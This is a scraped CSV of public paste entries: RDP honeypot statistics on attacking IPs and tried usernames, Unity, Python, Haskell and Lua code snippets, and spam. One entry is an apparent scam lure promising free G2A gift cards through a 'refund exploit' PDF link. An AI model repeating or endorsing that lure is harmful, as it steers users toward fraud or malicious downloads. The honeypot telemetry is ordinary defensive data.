id,title,username,language,date,content
690P6EQm,2024-02-29_stats.json,rdp_snitch,JSON,Thursday 29th of February 2024 06:16:17 PM CDT,"{
  ""ip"": {
    ""211.117.14.229"": 2,
    ""196.190.117.7"": 2,
    ""174.138.17.240"": 2,
    ""87.251.75.145"": 8,
    ""205.210.31.53"": 6,
    ""45.227.254.26"": 8,
    ""212.70.149.142"": 6,
    ""85.209.11.23"": 2,
    ""80.66.76.92"": 4,
    ""141.98.81.148"": 4,
    ""185.196.220.41"": 6,
    ""193.142.146.227"": 6,
    ""123.56.20.194"": 2,
    ""62.204.41.107"": 12,
    ""94.232.45.92"": 6,
    ""162.142.125.217"": 2,
    ""103.47.73.122"": 4,
    ""45.227.254.9"": 6,
    ""187.191.116.227"": 8,
    ""185.170.144.3"": 4,
    ""15.235.189.151"": 2,
    ""198.235.24.240"": 6,
    ""185.129.51.52"": 2,
    ""36.91.222.100"": 2,
    ""173.255.206.82"": 8,
    ""142.93.206.143"": 2,
    ""143.198.220.26"": 4,
    ""103.143.207.200"": 580,
    ""152.32.156.117"": 2,
    ""49.157.47.214"": 4,
    ""176.113.115.58"": 2,
    ""130.85.190.243"": 2,
    ""205.210.31.175"": 6,
    ""185.122.204.179"": 6,
    ""101.36.114.124"": 2,
    ""87.251.75.64"": 2,
    ""120.240.145.8"": 2,
    ""194.165.16.76"": 4,
    ""194.165.16.37"": 4,
    ""136.144.35.217"": 2,
    ""198.235.24.196"": 6
  },
  ""asn"": {
    ""AS9318"": 2,
    ""AS24757"": 2,
    ""AS14061"": 8,
    ""AS208091"": 14,
    ""AS396982"": 24,
    ""AS267784"": 14,
    ""AS204428"": 6,
    ""AS57523"": 8,
    ""AS209588"": 4,
    ""AS208046"": 12,
    ""AS37963"": 2,
    ""AS59425"": 12,
    ""AS212482"": 6,
    ""AS398324"": 2,
    ""AS133676"": 4,
    ""AS262545"": 8,
    ""AS197414"": 4,
    ""AS16276"": 2,
    ""AS200532"": 2,
    ""AS7713"": 2,
    ""AS63949"": 8,
    ""AS18403"": 580,
    ""AS135377"": 4,
    ""AS9658"": 4,
    ""AS57678"": 2,
    ""AS11131"": 2,
    ""AS56040"": 2,
    ""AS48721"": 8,
    ""AS396356"": 2
  },
  ""isp"": {
    ""SK Broadband Co Ltd"": 2,
    ""Ethiotelecom"": 2,
    ""DigitalOcean, LLC"": 8,
    ""Xhost Internet Solutions LP"": 24,
    ""Google LLC"": 24,
    ""Flyservers S.A."": 26,
    ""SS-Net"": 6,
    ""Chang Way Technologies Co. Limited"": 8,
    ""ColocationX Ltd."": 12,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""Horizon LLC"": 12,
    ""Censys, Inc."": 2,
    ""Precious netcom pvt ltd"": 4,
    ""Mandic S.A."": 8,
    ""OVH Singapore PTE. LTD"": 2,
    ""LLP \""Kompaniya Hoster.KZ\"""": 2,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Akamai Technologies, Inc."": 8,
    ""Vietnam Internet Network Information Center"": 580,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""Eastern Telecommunications Philippines, Inc."": 4,
    ""Cat Technologies Co. Limited"": 2,
    ""University of Maryland Baltimore County"": 2,
    ""China Mobile communications corporation"": 2,
    ""Latitude.sh"": 2
  },
  ""org"": {
    ""SK Broadband Co Ltd"": 2,
    ""Unknown"": 2,
    ""DigitalOcean, LLC"": 8,
    ""Xhost Internet Solutions"": 14,
    ""Palo Alto Networks, Inc"": 24,
    ""UAB Host Baltic"": 14,
    ""4Media Ltd"": 6,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Flyservers S.A"": 12,
    ""Makut Investments"": 6,
    ""ColocationX Ltd"": 6,
    ""Aliyun Computing Co., LTD"": 2,
    ""Horizon LLC"": 12,
    ""Dmitriy Panchenko"": 6,
    ""Censys Inc"": 2,
    ""Gstech Software Systems Pvt Ltd"": 4,
    ""Mandic S.A"": 8,
    ""Xhostis"": 4,
    ""Patrice, Auffret"": 2,
    ""Hosterkz Network"": 2,
    ""Telekomunikasi Indonesia"": 2,
    ""Linode"": 8,
    ""Everest Global Joint Stock Company"": 580,
    ""Ucloud Information Technology (hk) Limited"": 4,
    ""DSL Network"": 4,
    ""Cat Technologies Co. Limited"": 2,
    ""University of Maryland Baltimore County"": 2,
    ""Starcrecium Limited"": 6,
    ""China Mobile"": 2,
    ""Panq B.V"": 2
  },
  ""regionName"": {
    ""Incheon"": 2,
    ""Addis Ababa"": 2,
    ""South West"": 6,
    ""North Holland"": 24,
    ""California"": 24,
    ""Vilnius"": 14,
    ""Plovdiv"": 6,
    ""Moscow"": 22,
    ""Drenthe"": 4,
    ""Virginia"": 6,
    ""Beijing"": 2,
    ""Perm Krai"": 6,
    ""Michigan"": 2,
    ""National Capital Territory of Delhi"": 4,
    ""Sao Paulo"": 8,
    ""North West"": 2,
    ""Karaganda"": 2,
    ""Jakarta"": 2,
    ""Texas"": 8,
    ""New Jersey"": 4,
    ""Hanoi"": 580,
    ""Maharashtra"": 2,
    ""Metro Manila"": 4,
    ""Maryland"": 2,
    ""Seoul"": 2,
    ""Guangdong"": 2,
    ""Kaunas"": 8
  },
  ""country"": {
    ""South Korea"": 4,
    ""Ethiopia"": 2,
    ""Singapore"": 8,
    ""The Netherlands"": 28,
    ""United States"": 46,
    ""Lithuania"": 22,
    ""Bulgaria"": 6,
    ""Russia"": 28,
    ""China"": 4,
    ""India"": 6,
    ""Brazil"": 8,
    ""Kazakhstan"": 2,
    ""Indonesia"": 2,
    ""Vietnam"": 580,
    ""Philippines"": 4
  },
  ""account"": {
    ""(empty)"": 8,
    ""Test"": 28,
    ""hello"": 604,
    ""Administr"": 42,
    ""tAGzHuhjj"": 2,
    ""MEYMac"": 2,
    ""FKpdTr"": 2,
    ""Domain"": 26,
    ""Administrator"": 6,
    ""WDLhNieRX"": 2,
    ""rxlqNM"": 2,
    ""TQMKAM"": 2,
    ""fvlmf2qr"": 8,
    ""beio"": 2,
    ""IIZIkMA"": 2,
    ""aXQDnYsnH"": 2,
    ""hhWCiL"": 2,
    ""RZrIPt"": 2,
    ""oJcQMQbqT"": 2,
    ""EMppHB"": 2,
    ""WtyWgi"": 2
  },
  ""keyboard"": {
    ""Unknown"": 750
  },
  ""client_build"": {
    ""Unknown"": 750
  },
  ""client_name"": {
    ""Unknown"": 750
  },
  ""ip_type"": {
    ""Unknown"": 670,
    ""hosting & proxy"": 6,
    ""hosting"": 52,
    ""proxy"": 14,
    ""mobile"": 8
  }
}"
Uj7a6E4F,2024-02-29_stats.json,rdp_snitch,JSON,Thursday 29th of February 2024 06:15:09 PM CDT,"{
  ""ip"": {
    ""211.117.14.229"": 1,
    ""196.190.117.7"": 1,
    ""174.138.17.240"": 1,
    ""87.251.75.145"": 4,
    ""205.210.31.53"": 3,
    ""45.227.254.26"": 4,
    ""212.70.149.142"": 3,
    ""85.209.11.23"": 1,
    ""80.66.76.92"": 2,
    ""141.98.81.148"": 2,
    ""185.196.220.41"": 3,
    ""193.142.146.227"": 3,
    ""123.56.20.194"": 1,
    ""62.204.41.107"": 6,
    ""94.232.45.92"": 3,
    ""162.142.125.217"": 1,
    ""103.47.73.122"": 2,
    ""45.227.254.9"": 3,
    ""187.191.116.227"": 4,
    ""185.170.144.3"": 2,
    ""15.235.189.151"": 1,
    ""198.235.24.240"": 3,
    ""185.129.51.52"": 1,
    ""36.91.222.100"": 1,
    ""173.255.206.82"": 4,
    ""142.93.206.143"": 1,
    ""143.198.220.26"": 2,
    ""103.143.207.200"": 290,
    ""152.32.156.117"": 1,
    ""49.157.47.214"": 2,
    ""176.113.115.58"": 1,
    ""130.85.190.243"": 1,
    ""205.210.31.175"": 3,
    ""185.122.204.179"": 3,
    ""101.36.114.124"": 1,
    ""87.251.75.64"": 1,
    ""120.240.145.8"": 1,
    ""194.165.16.76"": 2,
    ""194.165.16.37"": 2,
    ""136.144.35.217"": 1,
    ""198.235.24.196"": 3
  },
  ""asn"": {
    ""AS9318"": 1,
    ""AS24757"": 1,
    ""AS14061"": 4,
    ""AS208091"": 7,
    ""AS396982"": 12,
    ""AS267784"": 7,
    ""AS204428"": 3,
    ""AS57523"": 4,
    ""AS209588"": 2,
    ""AS208046"": 6,
    ""AS37963"": 1,
    ""AS59425"": 6,
    ""AS212482"": 3,
    ""AS398324"": 1,
    ""AS133676"": 2,
    ""AS262545"": 4,
    ""AS197414"": 2,
    ""AS16276"": 1,
    ""AS200532"": 1,
    ""AS7713"": 1,
    ""AS63949"": 4,
    ""AS18403"": 290,
    ""AS135377"": 2,
    ""AS9658"": 2,
    ""AS57678"": 1,
    ""AS11131"": 1,
    ""AS56040"": 1,
    ""AS48721"": 4,
    ""AS396356"": 1
  },
  ""isp"": {
    ""SK Broadband Co Ltd"": 1,
    ""Ethiotelecom"": 1,
    ""DigitalOcean, LLC"": 4,
    ""Xhost Internet Solutions LP"": 12,
    ""Google LLC"": 12,
    ""Flyservers S.A."": 13,
    ""SS-Net"": 3,
    ""Chang Way Technologies Co. Limited"": 4,
    ""ColocationX Ltd."": 6,
    ""Hangzhou Alibaba Advertising Co"": 1,
    ""Horizon LLC"": 6,
    ""Censys, Inc."": 1,
    ""Precious netcom pvt ltd"": 2,
    ""Mandic S.A."": 4,
    ""OVH Singapore PTE. LTD"": 1,
    ""LLP \""Kompaniya Hoster.KZ\"""": 1,
    ""PT Telekomunikasi Indonesia"": 1,
    ""Akamai Technologies, Inc."": 4,
    ""Vietnam Internet Network Information Center"": 290,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Eastern Telecommunications Philippines, Inc."": 2,
    ""Cat Technologies Co. Limited"": 1,
    ""University of Maryland Baltimore County"": 1,
    ""China Mobile communications corporation"": 1,
    ""Latitude.sh"": 1
  },
  ""org"": {
    ""SK Broadband Co Ltd"": 1,
    ""Unknown"": 1,
    ""DigitalOcean, LLC"": 4,
    ""Xhost Internet Solutions"": 7,
    ""Palo Alto Networks, Inc"": 12,
    ""UAB Host Baltic"": 7,
    ""4Media Ltd"": 3,
    ""Chang Way Technologies Co. Limited"": 1,
    ""Flyservers S.A"": 6,
    ""Makut Investments"": 3,
    ""ColocationX Ltd"": 3,
    ""Aliyun Computing Co., LTD"": 1,
    ""Horizon LLC"": 6,
    ""Dmitriy Panchenko"": 3,
    ""Censys Inc"": 1,
    ""Gstech Software Systems Pvt Ltd"": 2,
    ""Mandic S.A"": 4,
    ""Xhostis"": 2,
    ""Patrice, Auffret"": 1,
    ""Hosterkz Network"": 1,
    ""Telekomunikasi Indonesia"": 1,
    ""Linode"": 4,
    ""Everest Global Joint Stock Company"": 290,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""DSL Network"": 2,
    ""Cat Technologies Co. Limited"": 1,
    ""University of Maryland Baltimore County"": 1,
    ""Starcrecium Limited"": 3,
    ""China Mobile"": 1,
    ""Panq B.V"": 1
  },
  ""regionName"": {
    ""Incheon"": 1,
    ""Addis Ababa"": 1,
    ""South West"": 3,
    ""North Holland"": 12,
    ""California"": 12,
    ""Vilnius"": 7,
    ""Plovdiv"": 3,
    ""Moscow"": 11,
    ""Drenthe"": 2,
    ""Virginia"": 3,
    ""Beijing"": 1,
    ""Perm Krai"": 3,
    ""Michigan"": 1,
    ""National Capital Territory of Delhi"": 2,
    ""Sao Paulo"": 4,
    ""North West"": 1,
    ""Karaganda"": 1,
    ""Jakarta"": 1,
    ""Texas"": 4,
    ""New Jersey"": 2,
    ""Hanoi"": 290,
    ""Maharashtra"": 1,
    ""Metro Manila"": 2,
    ""Maryland"": 1,
    ""Seoul"": 1,
    ""Guangdong"": 1,
    ""Kaunas"": 4
  },
  ""country"": {
    ""South Korea"": 2,
    ""Ethiopia"": 1,
    ""Singapore"": 4,
    ""The Netherlands"": 14,
    ""United States"": 23,
    ""Lithuania"": 11,
    ""Bulgaria"": 3,
    ""Russia"": 14,
    ""China"": 2,
    ""India"": 3,
    ""Brazil"": 4,
    ""Kazakhstan"": 1,
    ""Indonesia"": 1,
    ""Vietnam"": 290,
    ""Philippines"": 2
  },
  ""account"": {
    ""(empty)"": 4,
    ""Test"": 14,
    ""hello"": 302,
    ""Administr"": 21,
    ""tAGzHuhjj"": 1,
    ""MEYMac"": 1,
    ""FKpdTr"": 1,
    ""Domain"": 13,
    ""Administrator"": 3,
    ""WDLhNieRX"": 1,
    ""rxlqNM"": 1,
    ""TQMKAM"": 1,
    ""fvlmf2qr"": 4,
    ""beio"": 1,
    ""IIZIkMA"": 1,
    ""aXQDnYsnH"": 1,
    ""hhWCiL"": 1,
    ""RZrIPt"": 1,
    ""oJcQMQbqT"": 1,
    ""EMppHB"": 1,
    ""WtyWgi"": 1
  },
  ""keyboard"": {
    ""Unknown"": 375
  },
  ""client_build"": {
    ""Unknown"": 375
  },
  ""client_name"": {
    ""Unknown"": 375
  },
  ""ip_type"": {
    ""Unknown"": 335,
    ""hosting & proxy"": 3,
    ""hosting"": 26,
    ""proxy"": 7,
    ""mobile"": 4
  }
}"
mqbPdJXf,Review New Pastesbin,xxsa,PHP,Thursday 29th of February 2024 06:11:49 PM CDT,https://pastes.io/?red=pastes
Yw7549BG,Blaze Mover,BillMolloy,C#,Thursday 29th of February 2024 06:05:42 PM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.UI;



public class BlazeMover : MonoBehaviour
{
    [SerializeField] Animator anim;
    [SerializeField] LayerMask ground;
    [SerializeField] Transform groundCheck;
    [SerializeField] float xtiltMax;
    [SerializeField] float xtiltMin;
    [SerializeField] float ytiltMax;
    [SerializeField] float ytiltMin;
    [SerializeField] float xDeadZoneMin;
    [SerializeField] float xDeadZoneMax;
    [SerializeField] float yDeadZoneMin;
    [SerializeField] float yDeadZoneMax;
    public float xAcceleration;
    public float yAcceleration;
    public Vector3 acceleration;
    public Vector3 movementDir;
    public float horizontalMove;
    public float verticalMove;
    public float speed = 5f;


    void Update()
    {
        GroundCheck();
        Movement();
        Direction();
    }

    private void Movement()
    {
        // Get the accelerometer input
        acceleration = Input.acceleration;

        // Adjust the sensitivity
        acceleration = acceleration * Mathf.Pow(10, 1);

        // Clamp the accelerometer values within the defined tilt ranges
        xAcceleration = Mathf.Clamp(acceleration.x, xtiltMin, xtiltMax);
        yAcceleration = Mathf.Clamp(acceleration.y, ytiltMin, ytiltMax);

        // Apply dead zone for x-axis
        if (xAcceleration >= xDeadZoneMin && xAcceleration <= xDeadZoneMax)
        {
            xAcceleration = 0f; // Set xAcceleration to 0 if it's within the dead zone
        }

        // Apply dead zone for y-axis
        if (yAcceleration >= yDeadZoneMin && yAcceleration <= yDeadZoneMax)
        {
            yAcceleration = 0f; // Set yAcceleration to 0 if it's within the dead zone
        }

        // Calculate horizontal and vertical movement based on device orientation
        horizontalMove = -yAcceleration * speed;  // Adjusted for left-right movement
        verticalMove = xAcceleration * speed;     // Adjusted for forward-backward movement

        // Update the animation parameters
        anim.SetFloat(""x"", horizontalMove);
        anim.SetFloat(""y"", verticalMove);
    }



    //y axis on phone is forward and back, z in world
    //x axis on phone is left to right, x in world
    void Direction()
        {
            if (horizontalMove == 0 && verticalMove == 0)
            {
                transform.forward = Vector3.zero;
                movementDir = Vector3.zero;
                horizontalMove = 0;
                verticalMove = 0;
            }
            else
            {
                movementDir = new Vector3(horizontalMove, 0, verticalMove);
                movementDir.Normalize();
                transform.forward = movementDir;
                transform.Translate(speed * Time.deltaTime * movementDir, Space.World);
            }
        }

        void GroundCheck()
        {
            if (IsGrounded() == true)
            {
                anim.SetBool(""InAir"", false);
            }
            else
            {
                anim.SetBool(""InAir"", true);
                Debug.DrawLine(groundCheck.position, groundCheck.position + Vector3.down, Color.red);
            }
        }

        bool IsGrounded()
        {
            return Physics.CheckSphere(groundCheck.position, .3f, ground);
        }
}"
7rMj3ygk,Mega vs Sitrus Blastoise,flywinged,Python,Thursday 29th of February 2024 06:03:56 PM CDT,"# Python 3

# Assuming Jan's Blastoise IVs of 30 22 25 26 4 16

from random import random

N = 4_000_000
wins = 0
losses = 0
badResults = 0
riskingCrit = 0

testMega = True # NOTE: Change this to test mega or sitrus

minSlash = 23.6 if testMega else 25.4
maxSlash = 28 if testMega else 30.2
slashRange = maxSlash - minSlash

minBreak = 27.6 if testMega else 23
maxBreak = 32.8 if testMega else 27.2
breakRange = maxBreak - minBreak

riskPercent = maxSlash * 2.25

for i in range(N):

    turns = 0
    blastoiseHealth = 100
    inteleonHealth = 100

    risking = False

    while blastoiseHealth > 0 and inteleonHealth > 0:

        turns += 1
        breakDamage = minBreak + breakRange*random()

        if random() < 1/16:
            breakDamage *= 1.5

        seesKill = False
        if blastoiseHealth < minSlash:
            seesKill = True
        elif blastoiseHealth < maxSlash and random() > (blastoiseHealth-minSlash) / slashRange:
            seesKill = True
 
        # 11.666 is the percent chance of using air slash given mixed blastoise and light clay
        # 20% percent chance for slash to be +8 and tie with some screens
        # if slash ties, then 4 options, all equally likely.
        #   - Reflect +8, Screen +8 -> 1/3 chance to air slash
        #   - Reflect +8, Screen +7 -> 1/2 chance to air slash
        #   - Reflect +7, Screen +8 -> 1/2 chance to air slash
        #   - Reflect +7, Screen +7 -> 100% chance to slash
        # Altogether that is 25%*1/3 + 25%*1/2 + 25%*1/2 + 25%*1 = 58.33% Chance if rolls +8 slash
        #   This corresponds to a total of 58.33% * .2 = 11.666% chance to roll air slash.
        if random() < .1166666 or seesKill:
            slashDamage = minSlash + slashRange*random()
            if random() < 1/16:
                slashDamage *= 2.25
            blastoiseHealth -= slashDamage

            # flinches 30% of the time
            if random() > .3:
               inteleonHealth -= breakDamage

        else:
            inteleonHealth -= breakDamage

        # This is sitrus. Activates at less than 50% health
        if not testMega and blastoiseHealth < 50:
            blastoiseHealth += 25

        # Track any risk
        if blastoiseHealth < riskPercent and not risking:
            risking = True


    if blastoiseHealth < 0:
        losses += 1
    else:
        wins += 1
    
    if risking:
        riskingCrit += 1

print(wins/N, losses/N)
print(riskingCrit / N)

# Win = Blastoise survives and intelleon has no screens
# Lose = Blastoise dies and intelleon does not have screen up with some unknown hp

# All numbers are approximate as it is a simulation and some things damage
# calcs are smooth rather than discrete

# For mega, numbers are
# 98.9% Win, 1.1% lose
# 9.3% to be risking crit at some point

# For sitrus
# 99.99% Win, .01% lose
# 5.74% to be risking crit at some point"
MeKHqbSW,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Thursday 29th of February 2024 05:47:17 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_702105.pdf

Working as of:
29 February 2024"
sjTgUJFm,Ireland Lie Detector,spidspun,HTML,Thursday 29th of February 2024 05:08:29 PM CDT,"LIE DETECTOR LTD. IS THE LONGEST ESTABLISHED POLYGRAPH BUSINESS IN IRELAND
BPA / APA QUALIFIED, CERTIFIED | SIAN DEVINE MBA, M.SC.
When you choose us, you are choosing the most experienced and reliable examiners in Ireland. We are also the longest established polygraph business in Ireland. You can depend on us to deliver trustworthy results which will stand up to professional scrutiny. Our polygraph services are provided to corporate entities, businesses, government agencies, the legal profession and the general public. All our examiners are highly qualified and professional. We offer a reliable, flexible discreet service. All enquiries are treated in the strictest of confidence and all general enquiries are welcome.
<a href=""https://liedetector.ie/"">Lie Detector LTD Ireland</a>
01 685 4715
<a href=""https://maps.app.goo.gl/z2vzojkfJKmiLPgw5"">Lie Detector LTD Ireland</a>

"
Tnnvyn9J,"Quick, reliable pseudo-shuffler (enhanced)",banovski,Haskell,Thursday 29th of February 2024 05:06:24 PM CDT,"import Data.Function
import Data.List
import Data.List.Split

orderLists :: [a] -> [a] -> ([a], [a])
orderLists xs ys
  | on compare length xs ys == LT = (xs, ys)
  | otherwise = (ys, xs)

listsLengthQuotient :: ([a], [a]) -> ([a], [a], Int)
listsLengthQuotient (xs, ys) =
  (xs, ys, (round $ on (/) (fromIntegral . length) ys xs) :: Int)

groupListItems :: ([a], [a], Int) -> ([[a]], [[a]])
groupListItems (xs, ys, q) = (chunksOf 1 xs, chunksOf q ys)

merge :: ([a], [a]) -> [a]
merge (xs, []) = xs
merge ([], ys) = ys
merge (x:xs, y:ys) = x : y : merge (xs, ys)

mixLists :: [a] -> [a] -> [a]
mixLists xs ys =
  concat $ merge $ groupListItems $ listsLengthQuotient $ orderLists xs ys

main :: IO ()
main = do
  input <- getContents
  mapM_ putStrLn $
    foldl1 mixLists $ sortBy (on compare length) (group . sort $ lines input)
"
ubERFjFe,TvTurtle,erice0703,Lua,Thursday 29th of February 2024 03:14:35 PM CDT,"local modem = peripheral.find(""modem"")
local xi,yi,zi = gps.locate()
local xf,yf,zf = 5600, 152, 1306

local function GrabItems()
	local wool, monitor, computer = false, false, false
	repeat
		turtle.select(1)
		turtle.suckUp()
		local item = turtle.getItemDetail()
		if item.name == ""minecraft:white_wool"" then
			turtle.transferTo(5)
			wool = true
		elseif item.name == ""computercraft:monitor_advanced"" then
			turtle.transferTo(6)
			monitor = true
		elseif item.name == ""computercraft:computer_advanced"" then
			turtle.transferTo(7)
			computer = true
		end
	until wool == true and monitor == true and computer == true
end

local function Down(y)
	local yf = y
	local xi,yi,zi = gps.locate()
	turtle.forward()
	while yi ~= yf do
		turtle.down()
		xi,yi,zi = gps.locate()
	end
end
	
local function moveX(x,z)
	local x,z = x,z
	local xi,yi,zi = gps.locate()
	turtle.turnLeft()
	local difx = math.abs(x-xi)
	for i=1,difx do
	turtle.forward()
	end
end

local function moveZ(x,z)
	local x,z = x,z
	local xi,yi,zi = gps.locate()
	turtle.turnRight()
	local difz = math.abs(z-zi)
	for i =1,difz do
	turtle.forward()
	end
end

local function PlaceUp()
	turtle.place()
	turtle.up()
	turtle.place()
end

local function PlaceDown()
	turtle.place()
	turtle.down()
	turtle.place()
end
local function ForwardRight()
	turtle.turnRight()
	turtle.forward()
	turtle.turnLeft()
end
local function ForwardLeft()
	turtle.turnLeft()
	turtle.forward()
	turtle.turnRight()
end
local function backing()
	turtle.select(5)
	PlaceUp()
	ForwardLeft()
	PlaceDown()
	ForwardLeft()
	PlaceUp()
end


local function PlaceTV()
	turtle.select(6)
	turtle.back()
	
	PlaceDown()
	ForwardRight()
	PlaceUp()
	ForwardRight()
	PlaceDown()
end

local function PlaceComputer()
	turtle.select(7)
	turtle.down()
	ForwardLeft()
	turtle.place()
	turtle.turnRight()
	turtle.forward()
	turtle.forward()
	turtle.turnLeft()
	turtle.forward()
end
local function Dig()
	turtle.dig()
	turtle.digUp()
end
local function RemoveBacking()
	turtle.forward()
	turtl.turnLeft()
	turtle.up()
	Dig()
	turtle.forward()
	Dig()
	turtle.forward()
	Dig()
end	

local function Return()
	local x,y,z = 5600, 155, 1308
	local xi,yi,zi = gps.locate()
	turtle.turnRight()
	turtle.turnRight()
	for i=1,(math.abs(x-xi)) do
		turtle.forward()
	end
	for i=1,(math.abs(y-yi)) do
		turtle.up()
	end
	turtle.forward()
	turtle.turnRight()
	turtle.turnRight()

end


GrabItems()
Down(yf)
moveX(xf,zf)
turtle.turnRight()
turtle.up()
turtle.forward()
turtle.turnRight()
backing()
PlaceTV()
PlaceComputer()
RemoveBacking()
Return()"
f8Vd7etD,Untitled,sissou123,HTML,Thursday 29th of February 2024 03:06:31 PM CDT,"60 HTML CSS JS projects - HTML5, CSS3 and vanilla JavaScript
HTML CSS JS (JavaScript). Build 60 projects to learn HTML CSS JavaScript. 50+ HTML5, CSS3, vanilla JavaScript projects 
What you'll learn
Acquire the skills to develop exciting projects from scratch with pure HTML, CSS, and JavaScript - no external libraries or plugins needed!
Expand your knowledge of HTML, CSS, and JavaScript while mastering responsive web design principles. 
for more:https://cuty.io/98Ie
"
